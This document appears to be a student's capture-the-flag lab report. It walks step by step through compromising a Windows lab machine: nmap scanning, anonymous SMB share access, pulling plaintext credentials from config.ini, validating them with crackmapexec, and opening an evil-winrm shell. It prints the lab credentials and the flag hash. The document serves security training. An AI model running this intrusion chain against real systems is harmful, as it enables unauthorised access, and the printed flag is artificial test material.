# Lab 3 Report

## Table of Contents

- Reconnaissance
- Target Interaction
- Target Navigation
- Flags Retrieved

---

# Reconnaissance

## Machine 10.129.8.60

An Nmap scan was performed against the target machine to identify open ports and exposed services. The scan revealed that the system was running an SMB service on port 445/tcp.

### Command Used

```bash
nmap -sC -sV 10.129.8.60
```

The scan results indicated that SMB was exposed and accessible, suggesting potential file share enumeration opportunities.

<img width="886" height="569" alt="image" src="https://github.com/user-attachments/assets/4f8bf311-0e0d-4867-a821-a4aaeb27b2e6" />

---

# Target Interaction

## Commands and Tools Used

### Machine 10.129.8.60

- `smbclient` was used to enumerate available SMB shares anonymously.
- The **Config** share was accessed without authentication.
- A configuration file (`config.ini`) was discovered and downloaded.
- The file was analyzed locally, revealing plaintext credentials.
- `crackmapexec` was used to validate the credentials.
- `evil-winrm` was used to establish remote PowerShell access.

## Vulnerabilities Identified

| Machine | Vulnerability |
|----------|--------------|
| 10.129.8.60 | Anonymous SMB share access exposing plaintext credentials |

---

## Interactions with the Target

### Step 1 — SMB Share Enumeration

Enumerated SMB shares anonymously using:

```bash
smbclient -L //10.129.8.60 -N
```

The scan revealed multiple shares, including a potentially interesting share named **Config**.

<img width="823" height="374" alt="image" src="https://github.com/user-attachments/assets/ade0b91f-a8ca-4d3e-b9a9-619fad784ea4" />

---

### Step 2 — Accessing the Config Share

Connected to the Config share without credentials:

```bash
smbclient //10.129.8.60/Config -N
```

This confirmed that the share allowed anonymous access.

<img width="942" height="289" alt="image" src="https://github.com/user-attachments/assets/1e4d4951-3746-428a-a61c-52f5dd3b072a" />

---

### Step 3 — Listing Share Contents

Listed files inside the SMB share:

```bash
ls
```

A file named `config.ini` was discovered, indicating possible stored credentials.

<img width="942" height="289" alt="image" src="https://github.com/user-attachments/assets/53f215a0-47b1-418c-ae42-5705d7860d19" />

---

### Step 4 — Downloading the Configuration File

Downloaded the file locally and exited SMB:

```bash
get config.ini
exit
```

This allowed offline inspection of its contents.

<img width="932" height="114" alt="image" src="https://github.com/user-attachments/assets/587aa11a-5987-4a56-b5b2-3e0bf8c329a6" />

---

### Step 5 — Extracting Credentials

Reviewed the file:

```bash
cat config.ini
```

The file contained plaintext credentials:

| Field | Value |
|---------|---------|
| Username | claudio |
| Password | PurpleHaze! |

<img width="800" height="539" alt="image" src="https://github.com/user-attachments/assets/cb4d3666-1522-4184-bd87-e767d10c0ea1" />

---

### Step 6 — Credential Validation

Validated credentials using CrackMapExec:

```bash
crackmapexec smb 10.129.8.60 -u claudio -p 'PurpleHaze!'
```

The credentials were confirmed valid.

<img width="785" height="540" alt="image" src="https://github.com/user-attachments/assets/897a0e8e-648e-4361-862b-fd85a1eb9aa8" />

---

### Step 7 — Remote Access via Evil-WinRM

Established a remote session using:

```bash
evil-winrm -i 10.129.8.60 -u claudio -p 'PurpleHaze!'
```

A successful PowerShell session was obtained on the target machine.

<img width="975" height="389" alt="image" src="https://github.com/user-attachments/assets/2d8b8108-48c6-4e65-ab8e-749749b65771" />

---

# Target Navigation

## Machine 10.129.8.60

After gaining access via Evil-WinRM, system enumeration was performed to locate the user flag.

---

### Step 1 — Confirm User Context

```powershell
whoami
```

Confirmed access as user `claudio`.

<img width="819" height="93" alt="image" src="https://github.com/user-attachments/assets/199bbd43-662f-427d-8943-b82a360f7585" />


---

### Step 2 — Enumerating User Directories

```powershell
cd C:\Users
dir
```

Several user directories were identified, including **Public** and **claudio**.

<img width="619" height="327" alt="image" src="https://github.com/user-attachments/assets/9abfc11a-18a8-4d4a-a85c-68126d4c88fa" />


---

### Step 3 — Attempted Access to Public Directory

```powershell
cd Public
```

Access was denied due to insufficient permissions.

<img width="819" height="91" alt="image" src="https://github.com/user-attachments/assets/94386d65-0b01-4c49-aaa2-d6d8d8514e73" />


---

### Step 4 — Navigating to User Desktop

```powershell
cd C:\Users\claudio\Desktop
dir
```

The `user.txt` file was located in the Desktop directory.

<img width="902" height="311" alt="image" src="https://github.com/user-attachments/assets/a865ed81-3552-4387-962a-f92c3005fd15" />


---

### Step 5 — Reading the Flag

```powershell
type user.txt
```

The flag was successfully retrieved.

<img width="882" height="121" alt="image" src="https://github.com/user-attachments/assets/a58ffa05-d1f3-4332-a637-a5a919b30fac" />


---

# Flags Retrieved

## Machine 10.129.8.60

The flag was retrieved after exploiting anonymous SMB access, extracting credentials, and gaining remote PowerShell access.

```text
58e50f904aab05ac687efc1635421d78
```

